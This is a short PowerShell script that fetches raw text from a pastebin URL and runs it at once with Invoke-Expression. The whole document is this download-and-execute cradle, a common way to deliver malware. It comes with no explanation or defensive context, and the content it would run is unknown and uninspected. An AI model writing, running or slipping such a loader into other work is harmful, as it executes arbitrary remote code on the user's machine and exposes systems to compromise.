$scriptUrl = "https://pastebin.com/raw/34Dv0gCV"
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
Invoke-Expression -Command $scriptContent
